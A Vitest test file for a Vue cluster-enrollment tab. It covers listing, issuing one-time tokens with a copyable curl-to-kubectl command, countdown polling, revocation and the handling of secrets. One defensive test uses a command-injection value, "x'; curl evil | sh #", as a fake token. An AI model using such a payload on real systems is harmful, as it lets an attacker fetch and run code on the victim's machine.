import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { flushPromises, mount } from '@vue/test-utils'
import ClustersTab from './ClustersTab.vue'

const TOKEN = 'enr_' + 'Zx9-_'.repeat(8) + 'abc' // 43 characters after the prefix
const MANAGE = 'us-manage-key-0123456789abc'
const NOW = Date.parse('2026-11-10T12:00:00Z')
const iso = (offsetSec) => new Date(NOW + offsetSec * 1000).toISOString()
const session = (v = { project: 'gke', key: 'read-key-0123456789abcdef' }) => ({ get: () => v })
const stubs = { RouterLink: { template: '<a><slot/></a>' } }

const row = (over = {}) => ({ id: '0123456789ab', project: 'gke', cluster: 'gke', status: 'redeemed', created_at: iso(-3600), created_by: 'ana', expires_at: iso(-2700), redeemed_at: iso(-3500), ...over })

function memoryStorage() {
  const m = new Map()
  return { m, getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)) }
}

function clientOf({ rows = [], created, sendError, listError } = {}) {
  const state = { rows: [...rows] }
  return {
    state,
    get: vi.fn(async (path) => {
      if (listError) throw new Error(listError)
      if (path === 'enrollments') return state.rows
      throw new Error('unexpected ' + path)
    }),
    send: vi.fn(async (method, path, opts) => {
      if (sendError) throw new Error(sendError)
      if (method === 'POST') {
        const e = created || { id: 'aaaaaaaaaaaa', cluster: opts.body.cluster, status: 'pending', created_at: iso(0), expires_at: iso(900), token: TOKEN }
        state.rows = [{ ...e, project: 'gke', created_by: opts.actor || 'api' }, ...state.rows]
        return e
      }
      const id = path.split('/')[1]
      state.rows = state.rows.map((r) => (r.id === id ? { ...r, status: 'revoked', revoked_at: iso(0), revoked_by: opts.actor || 'api' } : r))
      return state.rows.find((r) => r.id === id)
    }),
  }
}

async function mountTab({ client = clientOf(), storage = memoryStorage(), props = {} } = {}) {
  const w = mount(ClustersTab, { props: { client, session: session(), storage, pollMs: 4000, ...props }, global: { stubs }, attachTo: document.body })
  await flushPromises()
  return { w, client, storage }
}
const set = (w, id, value) => w.get(`[data-testid=${id}]`).setValue(value)
async function fill(w, over = {}) {
  await set(w, 'cluster', over.cluster ?? 'gke')
  await set(w, 'url', over.url ?? 'http://hub:30081')
  await set(w, 'manage-key', over.key ?? MANAGE)
  if (over.actor) await set(w, 'actor', over.actor)
}
const submit = async (w) => {
  await w.get('form').trigger('submit')
  await flushPromises()
}

beforeEach(() => vi.useFakeTimers({ toFake: ['setInterval', 'clearInterval', 'Date'], now: NOW }))
afterEach(() => {
  vi.useRealTimers()
  document.body.innerHTML = ''
})

describe('ClustersTab: listing', () => {
  it('asks to connect first when there is no session', async () => {
    const { w, client } = await mountTab({ props: { session: session(null) } })
    expect(w.text()).toContain('Not connected')
    expect(w.find('form').exists()).toBe(false)
    expect(client.get).not.toHaveBeenCalled()
  })

  it('lists what has been enrolled, with what each is and what can be done to it', async () => {
    const client = clientOf({ rows: [
      row({ id: 'aaaaaaaaaaaa', cluster: 'one', status: 'pending', expires_at: iso(600), redeemed_at: undefined }),
      row({ id: 'bbbbbbbbbbbb', cluster: 'two' }),
      row({ id: 'cccccccccccc', cluster: 'three', status: 'revoked', revoked_at: iso(-60), revoked_by: 'bo' }),
      row({ id: 'dddddddddddd', cluster: 'four', status: 'expired', redeemed_at: undefined }),
    ] })
    const { w } = await mountTab({ client })
    const rows = w.findAll('tbody tr[data-id]')
    expect(rows.map((r) => r.attributes('data-status'))).toEqual(['pending', 'redeemed', 'revoked', 'expired'])
    expect(rows[0].text()).toContain('Waiting for the cluster')
    expect(rows[1].text()).toContain('Enrolled')
    expect(rows[2].text()).toContain('Revoked')
    expect(rows[2].text()).toContain('by bo')
    expect(rows[3].text()).toContain('Expired')
    expect(rows[1].text()).toContain('by ana')
    // only what can still be cut off has a button, and says what it does
    expect(rows.map((r) => r.find('[data-testid=revoke]').exists())).toEqual([true, true, false, false])
    expect(rows[0].get('[data-testid=revoke]').text()).toBe('Revoke')
    expect(rows[1].get('[data-testid=revoke]').text()).toBe('Cut off its key')
  })

  it('says so when there are none, and shows an error from the service as it is', async () => {
    const none = await mountTab()
    expect(none.w.get('[data-testid=none]').text()).toContain('No cluster has been enrolled')
    const bad = await mountTab({ client: clientOf({ listError: 'The telemetry service is not reachable right now.' }) })
    expect(bad.w.get('[role=alert]').text()).toContain('not reachable')
  })

  it('remembers the hub address and who is asking, for next time', async () => {
    const storage = memoryStorage()
    storage.setItem('fleet-ui.hub-url', 'http://remembered:30081')
    storage.setItem('fleet-ui.actor', 'ana@example.com')
    const { w } = await mountTab({ storage })
    expect(w.get('[data-testid=url]').element.value).toBe('http://remembered:30081')
    expect(w.get('[data-testid=actor]').element.value).toBe('ana@example.com')
  })
})

describe('ClustersTab: making an enrollment', () => {
  it('refuses a form that is not right, says which field and why, and asks nothing of the service', async () => {
    const { w, client } = await mountTab()
    await submit(w)
    expect(client.send).not.toHaveBeenCalled()
    expect(w.get('#cluster-e').text()).toContain('Give the cluster a name')
    expect(w.get('#url-e').text()).toContain('address')
    expect(w.get('#key-e').text()).toContain('manage key')
    expect(w.get('[data-testid=cluster]').attributes('aria-invalid')).toBe('true')

    await fill(w, { cluster: 'My Cluster', url: 'ftp://hub', key: ' ' })
    await submit(w)
    expect(w.get('#cluster-e').text()).toContain('Lower-case')
    expect(w.get('#url-e').text()).toContain('http')
    await fill(w, { actor: 'a;b' })
    await submit(w)
    expect(w.get('#actor-e').text()).toContain('Letters')
    expect(client.send).not.toHaveBeenCalled()
  })

  it('makes it with the manage key, and shows the command to run, once', async () => {
    const { w, client } = await mountTab()
    await fill(w, { actor: 'ana@example.com' })
    await w.get('[data-testid=ttl]').setValue(60)
    await submit(w)
    expect(client.send).toHaveBeenCalledTimes(1)
    expect(client.send).toHaveBeenCalledWith('POST', 'enrollments', { key: MANAGE, body: { cluster: 'gke', ttl_minutes: 60 }, actor: 'ana@example.com' })
    const cmd = w.get('[data-testid=command]').text()
    expect(cmd).toBe(`curl -fsS -X POST 'http://hub:30081/v1/enroll?format=secret' -H 'Content-Type: application/json' -d '{"token":"${TOKEN}"}' | kubectl apply -f -`)
    expect(w.get('[data-testid=issued]').text()).toContain('Run this on gke')
    expect(w.get('[data-testid=state]').text()).toContain('Waiting for the cluster')
    expect(w.get('[data-testid=state]').text()).toContain('15:00')
    expect(w.get('[role=note]').text()).toContain('only time the token is shown')
    expect(w.get('[data-testid=snippet]').text()).toContain('clusterName: gke')
  })

  it('does not keep the manage key: not in the field after, not in storage, not on the page', async () => {
    const { w, storage } = await mountTab()
    await fill(w, { actor: 'ana@example.com' })
    await submit(w)
    expect(w.get('[data-testid=manage-key]').element.value).toBe('')
    const kept = JSON.stringify([...storage.m])
    expect(kept).not.toContain(MANAGE)
    expect(kept).not.toContain(TOKEN)
    expect(kept).not.toContain('Zx9')
    expect(Object.fromEntries(storage.m)).toEqual({ 'fleet-ui.hub-url': 'http://hub:30081', 'fleet-ui.actor': 'ana@example.com' })
    expect(w.html()).not.toContain(MANAGE)
    // and the token is on the page only inside the command
    expect(w.text().split(TOKEN).length - 1).toBe(1)
  })

  it('shows the service\'s refusal, keeps the page as it was, and shows no command', async () => {
    const { w, storage } = await mountTab({ client: clientOf({ sendError: 'This key cannot change project "gke". It must be a manage key of that project, not the read key.' }) })
    await fill(w)
    await submit(w)
    expect(w.get('[data-testid=form-error]').text()).toContain('must be a manage key')
    expect(w.find('[data-testid=issued]').exists()).toBe(false)
    expect(storage.m.size).toBe(0)
    expect(w.html()).not.toContain(MANAGE)
  })

  it('does not show a command made from an answer that is not a token', async () => {
    const created = { id: 'aaaaaaaaaaaa', cluster: 'gke', status: 'pending', created_at: iso(0), expires_at: iso(900), token: "x'; curl evil | sh #" }
    const { w } = await mountTab({ client: clientOf({ created }) })
    await fill(w)
    await submit(w)
    expect(w.find('[data-testid=command]').exists()).toBe(false)
    expect(w.get('[data-testid=form-error]').text()).toContain('not a token')
    expect(w.html()).not.toContain('curl evil')
  })

  it('does not send twice when pressed twice', async () => {
    const { w, client } = await mountTab()
    await fill(w)
    await w.get('form').trigger('submit')
    await w.get('form').trigger('submit')
    await flushPromises()
    expect(client.send).toHaveBeenCalledTimes(1)
  })
})

describe('ClustersTab: waiting for the cluster', () => {
  it('counts the token\'s time down, and says when it has run out', async () => {
    const { w } = await mountTab()
    await fill(w)
    await submit(w)
    expect(w.get('[data-testid=state]').text()).toContain('15:00')
    vi.advanceTimersByTime(60_000)
    await flushPromises()
    expect(w.get('[data-testid=state]').text()).toContain('14:00')
    vi.advanceTimersByTime(14 * 60_000)
    await flushPromises()
    expect(w.get('[data-testid=state]').text()).toContain('expired without being used')
  })

  it('notices that the cluster enrolled, says so, and stops asking', async () => {
    const { w, client } = await mountTab()
    await fill(w)
    await submit(w)
    const asked = () => client.get.mock.calls.length
    vi.advanceTimersByTime(4000)
    await flushPromises()
    expect(w.get('[data-testid=state]').text()).toContain('Waiting')
    // the cluster runs the command
    client.state.rows = client.state.rows.map((r) => (r.id === 'aaaaaaaaaaaa' ? { ...r, status: 'redeemed', redeemed_at: iso(30) } : r))
    vi.advanceTimersByTime(4000)
    await flushPromises()
    expect(w.get('[data-testid=state]').text()).toContain('gke enrolled')
    expect(w.get('[data-testid=state]').classes()).toContain('ok')
    const n = asked()
    vi.advanceTimersByTime(40_000)
    await flushPromises()
    expect(asked()).toBe(n) // done: it does not keep asking
  })

  it('says when it was revoked meanwhile', async () => {
    const { w, client } = await mountTab()
    await fill(w)
    await submit(w)
    client.state.rows = client.state.rows.map((r) => ({ ...r, status: 'revoked' }))
    vi.advanceTimersByTime(4000)
    await flushPromises()
    expect(w.get('[data-testid=state]').text()).toContain('revoked')
  })

  it('stops its clocks when the page is left, and forgets the token', async () => {
    const { w, client } = await mountTab()
    await fill(w)
    await submit(w)
    const n = client.get.mock.calls.length
    w.unmount()
    vi.advanceTimersByTime(60_000)
    await flushPromises()
    expect(client.get.mock.calls.length).toBe(n)
    expect(vi.getTimerCount()).toBe(0)
  })

  it('removes the command when it is dismissed', async () => {
    const { w } = await mountTab()
    await fill(w)
    await submit(w)
    await w.get('[data-testid=dismiss]').trigger('click')
    expect(w.find('[data-testid=issued]').exists()).toBe(false)
    expect(w.html()).not.toContain(TOKEN)
    expect(vi.getTimerCount()).toBe(0)
  })

  it('copies the command, and says so, or says that the browser would not', async () => {
    const written = []
    Object.defineProperty(navigator, 'clipboard', { value: { writeText: async (t) => written.push(t) }, configurable: true })
    const { w } = await mountTab()
    await fill(w)
    await submit(w)
    await w.get('[data-testid=copy]').trigger('click')
    await flushPromises()
    expect(written).toEqual([w.get('[data-testid=command]').text()])
    expect(w.get('[data-testid=copied]').text()).toBe('Copied.')
    Object.defineProperty(navigator, 'clipboard', { value: { writeText: async () => { throw new Error('denied') } }, configurable: true })
    await w.get('[data-testid=copy]').trigger('click')
    await flushPromises()
    expect(w.get('[data-testid=copied]').text()).toContain('select the command')
  })
})

describe('ClustersTab: revoking', () => {
  const rows = () => [row({ id: 'aaaaaaaaaaaa', cluster: 'one', status: 'pending', redeemed_at: undefined, expires_at: iso(600) }), row({ id: 'bbbbbbbbbbbb', cluster: 'two' })]

  it('asks for the manage key first, and refuses an empty one without calling the service', async () => {
    const { w, client } = await mountTab({ client: clientOf({ rows: rows() }) })
    await w.findAll('[data-testid=revoke]')[1].trigger('click')
    expect(w.get('.revoke-row').text()).toContain('refused at their next report')
    await w.get('.revoke-row form').trigger('submit')
    await flushPromises()
    expect(w.get('[data-testid=revoke-error]').text()).toContain('manage key')
    expect(client.send).not.toHaveBeenCalled()
  })

  it('cuts off the enrollment with the key it is given, and shows it revoked', async () => {
    const storage = memoryStorage()
    storage.setItem('fleet-ui.actor', 'ana@example.com')
    const { w, client } = await mountTab({ client: clientOf({ rows: rows() }), storage })
    await w.findAll('[data-testid=revoke]')[1].trigger('click')
    await set(w, 'revoke-key', MANAGE)
    await w.get('.revoke-row form').trigger('submit')
    await flushPromises()
    expect(client.send).toHaveBeenCalledWith('DELETE', 'enrollments/bbbbbbbbbbbb', { key: MANAGE, actor: 'ana@example.com' })
    expect(w.find('.revoke-row').exists()).toBe(false)
    expect(w.findAll('tbody tr[data-id]')[1].attributes('data-status')).toBe('revoked')
    expect(w.html()).not.toContain(MANAGE)
  })

  it('shows the service\'s refusal and leaves the row as it was', async () => {
    const { w } = await mountTab({ client: clientOf({ rows: rows(), sendError: 'This key cannot change project "gke".' }) })
    await w.findAll('[data-testid=revoke]')[0].trigger('click')
    await set(w, 'revoke-key', 'a-read-key-by-mistake-0000')
    await w.get('.revoke-row form').trigger('submit')
    await flushPromises()
    expect(w.get('[data-testid=revoke-error]').text()).toContain('cannot change')
    expect(w.findAll('tbody tr[data-id]')[0].attributes('data-status')).toBe('pending')
  })

  it('opens one row at a time, and closes it again', async () => {
    const { w } = await mountTab({ client: clientOf({ rows: rows() }) })
    const buttons = () => w.findAll('[data-testid=revoke]')
    await buttons()[0].trigger('click')
    expect(w.findAll('.revoke-row')).toHaveLength(1)
    await buttons()[1].trigger('click')
    expect(w.findAll('.revoke-row')).toHaveLength(1)
    expect(w.get('.revoke-row').element.previousElementSibling.dataset.id).toBe('bbbbbbbbbbbb')
    await w.get('.revoke-row button.secondary').trigger('click')
    expect(w.find('.revoke-row').exists()).toBe(false)
  })
})
